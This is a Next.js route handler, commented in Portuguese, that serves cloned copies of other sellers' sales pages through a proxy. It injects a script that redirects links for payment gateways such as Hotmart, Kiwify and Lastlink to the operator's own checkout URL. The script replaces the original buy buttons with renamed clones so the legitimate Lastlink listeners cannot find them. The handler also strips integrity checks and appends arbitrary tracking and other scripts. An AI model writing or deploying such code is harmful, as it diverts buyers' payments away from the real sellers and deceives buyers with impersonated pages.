import { NextRequest, NextResponse } from 'next/server';
import { supabaseAdmin } from '@/lib/supabase';
import * as cheerio from 'cheerio';

/**
 * Page Proxy God Mode v7.0 — Original Stable
 */

export async function GET(
  req: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  try {
    const { id } = await params;

    // 1. Buscar página com fallback inteligente
    let { data: page, error } = await supabaseAdmin
      .from('cloned_pages')
      .select('*')
      .eq('id', id)
      .single();

    // Se não achar pelo ID (ex: /p/resultado), pega o último clone para manter a navegação ativa
    if (error || !page) {
      const { data: fallback } = await supabaseAdmin
        .from('cloned_pages')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(1)
        .single();
      page = fallback;
    }

    if (!page || !page.original_url) {
      return new NextResponse('<h1>Página não encontrada</h1>', { status: 404 });
    }

    const config = page.config || {};
    const originalUrl = page.original_url;
    const checkoutUrl = config.checkout_url || '';

    const response = await fetch(originalUrl, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
      },
    });

    if (!response.ok) {
      return new NextResponse(`<h1>Erro site original (${response.status})</h1>`, { status: 502 });
    }

    const buffer = await response.arrayBuffer();
    const rawHtml = new TextDecoder('utf-8').decode(buffer);
    const $ = cheerio.load(rawHtml);
    const baseUrl = new URL(originalUrl).origin;
    const targetHost = new URL(originalUrl).host;
    const currentOrigin = req.nextUrl.origin;

    // 1. BASE TAG (O que resolvia lindamente)
    $('base').remove();
    $('head').prepend(`<base href="${originalUrl}">`);

    // 2. Script para Checkout (Isolamento Definitivo e Trava de Segurança)
    const engineScript = `
      <script>
        (function() {
          const CHECKOUT_URL = '${checkoutUrl}';
          const gateways = ['checkout', 'pay.', 'comprar', 'hotmart', 'eduzz', 'monetizze', 'kiwify', 'braip', 'cakto', 'perfectpay', 'ticto', 'yampi', 'cartpanda', 'greenn', 'pepper', 'lowify', 'ironpay', 'lastlink', 'kirvano'];
          
          function patch() {
            if (!CHECKOUT_URL) return;

            // 1. O Interceptador Original (Com trava de 'http' para impedir bugs no meio do quiz com links relativos)
            document.querySelectorAll('a').forEach(el => {
              const h = (el.getAttribute('href') || '').toLowerCase();
              if ((h.startsWith('http') && gateways.some(g => h.includes(g))) || el.dataset.checkout) {
                el.href = CHECKOUT_URL;
                el.onclick = (e) => {
                  e.preventDefault();
                  e.stopPropagation();
                  const t = new URL(CHECKOUT_URL);
                  new URLSearchParams(window.location.search).forEach((v, k) => t.searchParams.set(k, v));
                  window.top.location.href = t.toString();
                };
              }
            });

            // 2. O Isolador do 2º Botão (Clona e DESTRÓI o ID original para que o script da Lastlink fique cego)
            document.querySelectorAll('button').forEach(btn => {
                const text = (btn.textContent || '').trim().toUpperCase();
                
                if (text.includes('OBTER MEU PLANO PERSONALIZADO') || text.includes('COMPRAR AGORA') || btn.id === '39Kr7c') {
                    if (!btn.dataset.isolated) {
                        const clone = btn.cloneNode(true);
                        clone.dataset.isolated = 'true';
                        // Mágica: Muda o ID para que event listeners globais do Lastlink não consigam reconhecer o botão!
                        if (clone.id) clone.id = clone.id + '_isolated';
                        
                        btn.parentNode.replaceChild(clone, btn);
                        
                        const action = (e) => {
                           e.preventDefault();
                           e.stopPropagation();
                           e.stopImmediatePropagation();
                           
                           // Rola suavemente até o 1º link de checkout patcheado
                           const firstCheckoutLink = Array.from(document.querySelectorAll('a')).find(a => a.href === CHECKOUT_URL);
                           
                           if (firstCheckoutLink) {
                               firstCheckoutLink.scrollIntoView({ behavior: 'smooth', block: 'center' });
                               firstCheckoutLink.style.transition = 'all 0.3s';
                               firstCheckoutLink.style.transform = 'scale(1.05)';
                               firstCheckoutLink.style.boxShadow = '0 0 20px rgba(0,255,0,0.5)';
                               
                               setTimeout(() => {
                                   firstCheckoutLink.style.transform = 'scale(1)';
                                   firstCheckoutLink.click();
                               }, 400);
                           } else {
                               const t = new URL(CHECKOUT_URL);
                               new URLSearchParams(window.location.search).forEach((v, k) => t.searchParams.set(k, v));
                               window.top.location.href = t.toString();
                           }
                        };
                        
                        // Captura o clique na fase mais prioritária (Capture Phase)
                        clone.addEventListener('click', action, { capture: true });
                        clone.addEventListener('mousedown', action, { capture: true });
                        clone.addEventListener('touchstart', action, { capture: true });
                        clone.addEventListener('pointerdown', action, { capture: true });
                        clone.addEventListener('touchend', action, { capture: true });
                    }
                }
            });
          }
          setInterval(patch, 2000);
        })();
      </script>
    `;
    $('head').append(engineScript);

    // 3. Proxy de Assets (Para não dar tela preta)
    $('[src], [href]').each((_, el) => {
      const tag = $(el).prop('tagName');
      const attr = $(el).attr('src') ? 'src' : 'href';
      let val = $(el).attr(attr) || '';
      if (!val || val.startsWith('data:') || val.startsWith('javascript:') || val.startsWith('#')) return;

      if (tag === 'SCRIPT' || (tag === 'LINK' && $(el).attr('rel') === 'stylesheet')) {
        const abs = val.startsWith('/') ? baseUrl + val : (val.startsWith('http') ? val : baseUrl + '/' + val);
        $(el).attr(attr, `${currentOrigin}/api/proxy?url=${encodeURIComponent(abs)}&overrideHost=${targetHost}`);
        $(el).removeAttr('integrity').removeAttr('crossorigin');
      }
    });

    if (config.pixel_script) $('body').append(config.pixel_script);
    if (config.head_scripts) $('head').append(config.head_scripts);
    if (config.body_scripts) $('body').append(config.body_scripts);

    return new NextResponse($.html(), { headers: { 'Content-Type': 'text/html; charset=utf-8' } });

  } catch (error: any) {
    return new NextResponse(`Erro: ${error.message}`, { status: 500 });
  }
}
